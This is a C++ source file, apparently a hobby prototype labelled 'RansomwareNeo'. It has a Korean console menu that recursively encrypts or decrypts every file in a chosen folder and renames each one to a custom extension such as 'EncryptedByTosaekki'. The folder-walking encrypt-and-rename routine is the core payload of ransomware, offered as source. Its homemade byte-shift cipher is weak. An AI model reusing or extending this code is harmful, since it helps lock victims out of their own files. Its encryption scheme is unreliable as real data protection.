#include <iostream>
#include <bitset>
#include <array>
#include <cassert>
#include <cmath>
#include <cstdint>
#include <cstdio>
#include <iomanip>
#include <fstream>
#include <sstream>
#include <vector>
#include <windows.h>
#include <conio.h>
#include <io.h>
#include <direct.h>

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

constexpr auto MAXSIZE = 1000000000;

using namespace std;

int KeyDepth = 1;
string Signature;

void gotoxy(int x, int y) {
    COORD pos = { x,y };
    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), pos);
}

uint32_t ChangeEndian(uint32_t x)
{
    x = ((x << 8) & 0xFF00FF00) | ((x >> 8) & 0xFF00FF);
    return (x << 16) | (x >> 16);
}

uint64_t ChangeEndian(uint64_t x)
{
    x = ((x << 8) & 0xFF00FF00FF00FF00ULL) | ((x >> 8) & 0x00FF00FF00FF00FFULL);
    x = ((x << 16) & 0xFFFF0000FFFF0000ULL) | ((x >> 16) & 0x0000FFFF0000FFFFULL);
    return (x << 32) | (x >> 32);
}

uint32_t RotateRight(uint32_t x, uint32_t n)
{
    return (x >> n) | (x << (32 - n));
}

uint32_t SSigma_0(uint32_t x)
{
    return RotateRight(x, 7) ^ RotateRight(x, 18) ^ (x >> 3);
}

uint32_t SSigma_1(uint32_t x)
{
    return RotateRight(x, 17) ^ RotateRight(x, 19) ^ (x >> 10);
}

uint32_t BSigma_0(uint32_t x)
{
    return RotateRight(x, 2) ^ RotateRight(x, 13) ^ RotateRight(x, 22);
}

uint32_t BSigma_1(uint32_t x)
{
    return RotateRight(x, 6) ^ RotateRight(x, 11) ^ RotateRight(x, 25);
}

uint32_t Choose(uint32_t x, uint32_t y, uint32_t z)
{
    return (x & y) ^ (~x & z);
}

uint32_t Majority(uint32_t x, uint32_t y, uint32_t z)
{
    return (x & y) ^ (x & z) ^ (y & z);
}

array<uint32_t, 8> Make_H0()
{
    const double kPrimeList[] = { 2, 3, 5, 7, 11, 13, 17, 19 };
    static_assert(sizeof(kPrimeList) / sizeof(*kPrimeList) == 8, "");

    array<uint32_t, 8> H;

    for (int i = 0; i < 8; ++i)
    {
        auto v = sqrt(kPrimeList[i]);

        v -= static_cast<uint32_t>(v);
        v *= pow(16, 8);

        H[i] = static_cast<uint32_t>(v);
    }

    return H;
}

array<uint32_t, 64> Make_K()
{
    double kPrimeList[] = {
        2, 3, 5, 7, 11, 13, 17, 19, 23, 29,
        31, 37, 41, 43, 47, 53, 59, 61, 67, 71,
        73, 79, 83, 89, 97, 101, 103, 107, 109, 113,
        127, 131, 137, 139, 149, 151, 157, 163, 167, 173,
        179, 181, 191, 193, 197, 199, 211, 223, 227, 229,
        233, 239, 241, 251, 257, 263, 269, 271, 277, 281,
        283, 293, 307, 311
    };
    static_assert(sizeof(kPrimeList) / sizeof(*kPrimeList) == 64, "");

    array<uint32_t, 64> K;

    for (int i = 0; i < 64; ++i)
    {
        auto v = cbrt(kPrimeList[i]);

        v -= static_cast<uint32_t>(v);
        v *= pow(16, 8);

        K[i] = static_cast<uint32_t>(v);
    }

    return K;
}

array<uint32_t, 64> Make_W(const uint8_t(&M)[64])
{
    array<uint32_t, 64> W;

    for (int i = 0; i < 16; ++i)
    {
        W[i] = ChangeEndian(reinterpret_cast<uint32_t const&>(M[i * 4]));
    }

    for (int i = 16; i < 64; ++i)
    {
        W[i] = SSigma_1(W[i - 2]) + W[i - 7] + SSigma_0(W[i - 15]) + W[i - 16];
    }

    return W;
}

array<uint32_t, 8> Round(array<uint32_t, 8> const& H, uint32_t K, uint32_t W)
{
    array<uint32_t, 8> nH;

    auto maj = Majority(H[0], H[1], H[2]);
    auto ch = Choose(H[4], H[5], H[6]);
    auto s = K + BSigma_1(H[4]) + ch + H[7] + W;

    nH[0] = BSigma_0(H[0]) + maj + s;
    nH[1] = H[0];
    nH[2] = H[1];
    nH[3] = H[2];
    nH[4] = H[3] + s;
    nH[5] = H[4];
    nH[6] = H[5];
    nH[7] = H[6];

    return nH;
}

void PreProcess(vector<uint8_t>& message)
{
    auto L = static_cast<uint64_t>(message.size());

    message.push_back(0b10000000);

    auto K = 64 - (((L % 64) + 9) % 64);
    if (K == 64) K = 0;

    for (int i = 0; i < K; ++i)
    {
        message.push_back(0);
    }

    assert(L <= UINT64_MAX / 8);
    uint64_t bitLengthInBigEndian = ChangeEndian(L * 8);
    auto ptr = reinterpret_cast<uint8_t*>(&bitLengthInBigEndian);

    message.insert(end(message), ptr, ptr + 8);
    assert(message.size() % 64 == 0);
}

array<uint32_t, 8> Process(vector<uint8_t> const& message)
{
    assert(message.size() % 64 == 0);

    const auto K = Make_K();
    const auto blockCount = message.size() / 64;

    auto digest = Make_H0();

    for (int i = 0; i < blockCount; ++i)
    {
        auto W = Make_W(reinterpret_cast<const uint8_t(&)[64]>(message[i * 64]));
        auto H = digest;

        for (int r = 0; r < 64; ++r)
        {
            H = Round(H, K[r], W[r]);
        }

        for (int i = 0; i < 8; ++i)
        {
            digest[i] += H[i];
        }
    }

    return digest;
}


string Hexify(array<uint32_t, 8> const& digest)
{
    stringstream stream;

    for (auto x : digest)
    {
        stream << setfill('0') << setw(8) << hex << x;
    }

    return stream.str();
}

string SHA256(vector<uint8_t> message)
{
    PreProcess(message);
    auto digest = Process(message);
    return Hexify(digest);
}

string SHAmain(string tmp)
{
    vector<uint8_t> inp;
    for (int i = 0; i < tmp.size(); i++) {
        inp.push_back(tmp[i]);
    }
    return SHA256(inp);
}

string H_to_B(string inputstring) {
    string ResultString;
    string splitstring[4];
    uint64_t hashbinary[4] = {};
    for (int i = 0; i < 4; i++)
        for (int j = 0; j < 16; j++)
            splitstring[i].push_back(inputstring[i * 16 + j]);
    for (int i = 0; i < 4; i++) {
        stringstream convert(splitstring[i]);
        convert >> hex >> hashbinary[i];
        bitset<64> BitHash = bitset<64>(hashbinary[i]);
        ResultString.append(BitHash.to_string());
    }
    return ResultString;
}

bool FileEncrypt(string FileName, string EncKey) {
    char* Encrypted = {};
    int encp;
    string NewFileName, thx;
    encp = EncKey[0];
    int dot = FileName.find('.');
    for (int i = 0; i < dot; i++)
        NewFileName += FileName[i];
    for (int i = dot + 1; i < FileName.size(); i++)
        thx += FileName[i];
    NewFileName = NewFileName + "." + Signature;
    int size;
    FILE* encf;
    encf = fopen(FileName.c_str(), "rb");
    if (encf == NULL)
        return false;
    fseek(encf, 0, SEEK_END);
    size = ftell(encf);
    fseek(encf, 0, SEEK_SET);
    if (size > MAXSIZE)
        size = MAXSIZE;
    Encrypted = (char*)malloc(sizeof(char) * (size + thx.size() + 2));
    if (Encrypted == NULL)
        return false;
    fread(Encrypted, sizeof(char), size, encf);
    fclose(encf);
    string BinaryKey = H_to_B(SHAmain(EncKey));
    for (int i = 0; i < size; i++) {
        if (BinaryKey[i % 256] == '1')
            Encrypted[i] += encp;
        else
            Encrypted[i] -= encp;
    }
    int j = 0;
    for (int i = size; i < size + thx.size(); i++) {
        Encrypted[i] = thx[j];
        j++;
    }
    Encrypted[size + thx.size()] = thx.size();
    Encrypted[size + thx.size() + 1] = NULL;
    encf = fopen(FileName.c_str(), "wb");
    if (encf == NULL) return false;
    fwrite(Encrypted, sizeof(char), size + thx.size() + 1, encf);
    fclose(encf);
    free(Encrypted);
    rename(FileName.c_str(), NewFileName.c_str());
    return true;
}

bool FileDecrypt(string FileName, string DecKey) {
    char* Decrypted = {};
    int decp;
    string NewFileName, thx;
    decp = DecKey[0];
    int dot = FileName.find('.');
    for (int i = 0; i < dot; i++)
        NewFileName += FileName[i];
    int size;
    FILE* decf;
    decf = fopen(FileName.c_str(), "rb");
    if (decf == NULL)
        return false;
    fseek(decf, 0, SEEK_END);
    size = ftell(decf);
    fseek(decf, 0, SEEK_SET);
    if (size > MAXSIZE)
        size = MAXSIZE;
    Decrypted = (char*)malloc(sizeof(char) * (size));
    if (Decrypted == NULL)
        return false;
    fread(Decrypted, sizeof(char), size, decf);
    fclose(decf);
    char thxsize = Decrypted[size - 1];
    Decrypted[size - 1] = NULL;
    string BinaryKey = H_to_B(SHAmain(DecKey));
    for (int i = 0; i < size - thxsize - 1; i++) {
        if (BinaryKey[i % 256] == '1')
            Decrypted[i] -= decp;
        else
            Decrypted[i] += decp;
    }
    for (int i = size - thxsize - 1; i < size - 1; i++) {
        thx.push_back(Decrypted[i]);
        Decrypted[i] = NULL;
    }
    NewFileName = NewFileName + "." + thx;
    decf = fopen(FileName.c_str(), "wb");
    if (decf == NULL) return false;
    fwrite(Decrypted, sizeof(char), size - thxsize - 1, decf);
    fclose(decf);
    free(Decrypted);
    rename(FileName.c_str(), NewFileName.c_str());
    return true;
}

void FolderEncrypt(string FileLocation, string EncKey) {
    string path, FileName, FilePath;
    path = FileLocation + "*.*";
    struct _finddata_t fd;
    intptr_t handle;
    if ((handle = _findfirst(path.c_str(), &fd)) == -1L) {
        cout << "디렉토리를 찾을 수 없습니다" << endl;
        return;
    }
    bool success;
    while (true)
    {
        FileName = fd.name;
        if (FileName.find('.') == string::npos)
            FolderEncrypt(FileLocation + FileName + '\\', EncKey);
        FilePath = FileLocation + fd.name;
        success = FileEncrypt(FilePath, EncKey);
        if (success)
            cout << KeyDepth << "번째 파일 ( " << fd.name << " ) : " << "성공" << endl;
        else
            cout << KeyDepth << "번째 파일 ( " << fd.name << " ) : " << "실패" << endl;
        KeyDepth++;
        if (_findnext(handle, &fd) != 0)
            break;
    }
    _findclose(handle);
    return;
}

void FolderDecrypt(string FileLocation, string DecKey) {
    string path, FileName, FilePath;
    path = FileLocation + "*.*";
    struct _finddata_t fd;
    intptr_t handle;
    if ((handle = _findfirst(path.c_str(), &fd)) == -1L) {
        cout << "디렉토리를 찾을 수 없습니다" << endl;
        return;
    }
    bool success;
    while (true)
    {
        FileName = fd.name;
        if (FileName.find('.') == string::npos)
            FolderDecrypt(FileLocation + FileName + '\\', DecKey);
        FilePath = FileLocation + fd.name;
        success = FileDecrypt(FilePath, DecKey);
        if (success)
            cout << KeyDepth << "번째 파일 ( " << fd.name << " ) : " << "성공" << endl;
        else
            cout << KeyDepth << "번째 파일 ( " << fd.name << " ) : " << "실패" << endl;
        KeyDepth++;
        if (_findnext(handle, &fd) != 0)
            break;
    }
    _findclose(handle);
    return;
}

int main() {
    system("color 0a");
    FILE* pswrd;
    pswrd = fopen("C:\\Users\\cino\\AppData\\Roaming\\RansomwareNeo\\password.txt", "rb");
    if (pswrd != NULL) {
        cout << "암호를 입력하세요 : ";
        while (true) {
            string passwordinput;
            string passwordhash;
            char passwordhashinput[66];
            fgets(passwordhashinput, 65, pswrd);
            passwordhash = passwordhashinput;
            getline(cin, passwordinput);
            if (!passwordhash.compare(SHAmain(passwordinput)))
                break;
            cout << "암호가 틀렸습니다. 다시 입력해주세요 : ";
        }
        system("cls");
        fclose(pswrd);
    }
    FILE* sgntr;
    sgntr = fopen("C:\\Users\\cino\\AppData\\Roaming\\RansomwareNeo\\signature.txt", "rb");
    if (sgntr != NULL) {
        char* _Signature;
        fseek(sgntr, 0, SEEK_END);
        int sgntrsize = ftell(sgntr);
        fseek(sgntr, 0, SEEK_SET);
        _Signature = (char*)malloc(sizeof(char) * (sgntrsize + 1));
        fread(_Signature, sizeof(char), sgntrsize, sgntr);
        _Signature[sgntrsize] = NULL;
        Signature = _Signature;
        fclose(sgntr);
        free(_Signature);
    }
    else
        Signature = "EncryptedByTosaekki";
    if (Signature.empty())
        Signature = "EncryptedByTosaekki";

    cout << "암호화와 복호화 작업중 어느 작업을 선택하시겠습니까?" << endl << endl << "암호화 <" << endl << "복호화 ";
    gotoxy(8, 2);
    bool up = true;
    int debug = 5;
    while (true) {
        char keyin = getch();
        if (keyin == 80 && up) {
            gotoxy(7, 2);
            cout << "\b  ";
            gotoxy(7, 3);
            cout << '<';
            up = false;
        }
        else if (keyin == 72 && !up) {
            gotoxy(7, 3);
            cout << "\b  ";
            gotoxy(7, 2);
            cout << '<';
            up = true;
        }
        else if (keyin == 13) {
            system("cls");
            if (!debug) {
                debug = 5;
                cout << "암호화와 복호화 작업중 어느 작업을 선택하시겠습니까?" << endl << endl << "암호화 <" << endl << "복호화 ";
                gotoxy(8, 2);
                continue;
            }
            if (up) {
                string FileLocation, EncKey;
                while (true) {
                    cout << "암호화할 폴더 경로를 입력하세요 : ";
                    getline(cin, FileLocation);
                    if (FileLocation.empty())
                        cout << "폴더 경로는 최소 한글자 이상이여야 합니다." << endl;
                    else break;
                }
                if (FileLocation.back() != '\\')
                    FileLocation.push_back('\\');
                while (true) {
                    cout << "암호화 키를 입력하세요 : ";
                    getline(cin, EncKey);
                    if (EncKey.empty())
                        cout << "암호화 키는 최소 한글자 이상이여야 합니다." << endl;
                    else break;
                }
                FolderEncrypt(FileLocation, EncKey);
                break;
            }
            else {
                string FileLocation, DecKey;
                while (true) {
                    cout << "복호화할 폴더 경로를 입력하세요 : ";
                    getline(cin, FileLocation);
                    if (FileLocation.empty())
                        cout << "폴더 경로는 최소 한글자 이상이여야 합니다." << endl;
                    else break;
                }
                if (FileLocation.back() != '\\')
                    FileLocation.push_back('\\');
                while (true) {
                    cout << "복호화 키를 입력하세요 : ";
                    getline(cin, DecKey);
                    if (DecKey.empty())
                        cout << "복호화 키는 최소 한글자 이상이여야 합니다." << endl;
                    else break;
                }
                FolderDecrypt(FileLocation, DecKey);
                break;
            }
        }
        else if (keyin == 'a') {
            FILE* sgntr;
            sgntr = fopen("C:\\Users\\cino\\AppData\\Roaming\\RansomwareNeo\\signature.txt", "wb");
            if (sgntr == NULL) {
                mkdir("C:\\Users\\cino\\AppData\\Roaming\\RansomwareNeo");
                ofstream out("C:\\Users\\cino\\AppData\\Roaming\\RansomwareNeo\\signature.txt");
                out.close();
                FILE* sgntr;
                sgntr = fopen("C:\\Users\\cino\\AppData\\Roaming\\RansomwareNeo\\signature.txt", "wb");
            }
            string _signature;
            system("cls");
            cout << "암호화 파일 확장자 설정 : ";
            cin >> _signature;
            char* _newsignature;
            _newsignature = (char*)malloc(sizeof(char) * (_signature.size() + 1));
            for (int i = 0; i < _signature.size(); i++) {
                _newsignature[i] = _signature[i];
            }
            _newsignature[_signature.size()] = NULL;
            fputs(_newsignature, sgntr);
            fclose(sgntr);
            free(_newsignature);
            cout << "암호화 파일 확장자가 정상적으로 저장되었습니다." << endl;
            break;
        }
        else if (keyin == 's') {
            FILE* pswrd;
            pswrd = fopen("C:\\Users\\cino\\AppData\\Roaming\\RansomwareNeo\\password.txt", "wb");
            if (pswrd == NULL) {
                mkdir("C:\\Users\\cino\\AppData\\Roaming\\RansomwareNeo");
                ofstream out("C:\\Users\\cino\\AppData\\Roaming\\RansomwareNeo\\password.txt");
                out.close();
                FILE* pswrd;
                pswrd = fopen("C:\\Users\\cino\\AppData\\Roaming\\RansomwareNeo\\password.txt", "wb");
            }
            string password;
            system("cls");
            cout << "비밀번호 설정 : ";
            getline(cin, password);
            string newpasswordinp = SHAmain(password);
            char newpassword[66] = {};
            for (int i = 0; i < 65; i++) {
                newpassword[i] = newpasswordinp[i];
            }
            fputs(newpassword, pswrd);
            fclose(pswrd);
            cout << "암호가 정상적으로 저장되었습니다." << endl;
            break;
        }
    }
    cout << endl << "아무 키나 눌러 종료하십시오...";
    getch();
    return 0;
}